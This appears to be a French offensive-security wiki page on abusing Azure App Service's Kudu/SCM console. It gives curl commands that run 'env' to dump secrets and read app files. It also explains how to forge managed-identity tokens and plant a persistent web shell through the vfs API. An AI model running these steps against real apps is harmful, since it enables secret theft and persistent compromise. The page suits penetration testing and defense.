---
title: "Kudu et SCM : un web shell et l'accès aux fichiers sur l'hôte de l'application"
order: 1
description: "Utiliser la console Kudu et SCM d'App Service pour obtenir un web shell, l'accès aux fichiers et les secrets d'environnement."
keywords:
  - Kudu
  - SCM
  - web shell
  - App Service
  - console
---

# Kudu et SCM

Toute application App Service dispose d'un **site SCM** associé à `https://<app>.scm.azurewebsites.net` exécutant **Kudu**, qui fournit une console de débogage, une API de système de fichiers et un explorateur de processus. Authentifié avec les identifiants de publication de l'application ou un jeton ARM, Kudu est un shell direct sur l'hôte de l'application et expose les variables d'environnement de celle-ci, qui contiennent les chaînes de connexion et les secrets de l'endpoint d'identité managée.

## Atteindre la console et exécuter des commandes

```bash
# interactive debug console in the browser
# https://<app>.scm.azurewebsites.net/DebugConsole

# command API (basic auth with publishing creds, or Bearer ARM token)
curl -s -u '<deployuser>:<deploypass>' \
  -X POST "https://<app>.scm.azurewebsites.net/api/command" \
  -H 'Content-Type: application/json' \
  -d '{"command":"env","dir":"site\\wwwroot"}'

# filesystem read/write
curl -s -u '<deployuser>:<deploypass>' \
  "https://<app>.scm.azurewebsites.net/api/vfs/site/wwwroot/"
```

## Notes d'exploitation

- Kudu s'exécute dans le contexte de l'application ; `env` divulgue les chaînes de connexion ainsi que les `IDENTITY_ENDPOINT`/`IDENTITY_HEADER` servant à forger le jeton de l'[identité managée](managed-identity.md).
- Écrire un handler dans `site/wwwroot` via l'API vfs implante un web shell persistant.
- Un jeton ARM doté de `Microsoft.Web/sites/publish/action` s'authentifie auprès de SCM sans le mot de passe de publication ; voir [identifiants de déploiement](deployment-credentials.md).

## Outils

- **Kudu** : console de débogage et API REST.
- **MicroBurst** / **PowerZure** : énumération App Service et extraction d'identifiants.

## Références

- [Microsoft: Kudu service overview](https://learn.microsoft.com/azure/app-service/resources-kudu)
- [HackTricks Cloud: Azure App Service](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [PowerZure](https://github.com/hausec/PowerZure)
